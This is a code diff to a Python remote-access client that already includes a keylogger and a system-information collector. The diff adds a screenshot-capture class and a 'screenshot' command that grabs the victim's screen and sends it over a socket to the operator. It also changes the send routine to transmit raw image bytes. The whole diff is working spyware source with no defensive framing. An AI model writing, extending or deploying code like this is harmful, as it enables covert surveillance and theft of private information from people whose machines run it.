@@ -8,9 +8,11 @@ import tabulate
 import signal
 import shlex
 import platform
+import io
 import psutil
 import subprocess
 import threading
+import pyscreenshot
 from datetime import datetime
 from pynput.keyboard import Key, Listener
 
@@ -161,6 +163,22 @@ class SYSINFO:
                             self.mem_usage + "\n\n" + self.disk_info + "\n\n" + self.net_info + "\n\n"
         return self.DATA_STRING
 
+class SCREENSHOT:
+
+    SC_DATA = b""
+
+    def __init__(self):
+        self.generate()
+
+    def generate(self):
+        obj = io.BytesIO()
+        im  = pyscreenshot.grab()
+        im.save(obj, format="PNG")
+        self.SC_DATA = obj.getvalue()
+
+    def get_data(self):
+        return self.SC_DATA
+
 class CLIENT:
 
     SOCK = None
@@ -172,8 +190,11 @@ class CLIENT:
         self.ipaddress = _ip
         self.port      = _pt
 
-    def send_data(self, tosend):
-        self.SOCK.send(base64.encodebytes(tosend.encode('utf-8')) + self.KEY.encode('utf-8'))
+    def send_data(self, tosend, encode=True):
+        if encode:
+            self.SOCK.send(base64.encodebytes(tosend.encode('utf-8')) + self.KEY.encode('utf-8'))
+        else:
+            self.SOCK.send(base64.encodebytes(tosend) + self.KEY.encode('utf-8'))
 
     def turn_keylogger(self, status):
         def on_press(key):
@@ -242,6 +263,12 @@ class CLIENT:
             print("Executing Sysinfo: " + data[1])
             sysinfo = SYSINFO()
             self.send_data(sysinfo.get_data())
+
+        elif data[0] == "screenshot":
+
+            print("Executing Screenshot: " + data[1])
+            screenshot = SCREENSHOT()
+            self.send_data(screenshot.get_data(), encode=False)
 
     def acceptor(self):
         data = ""
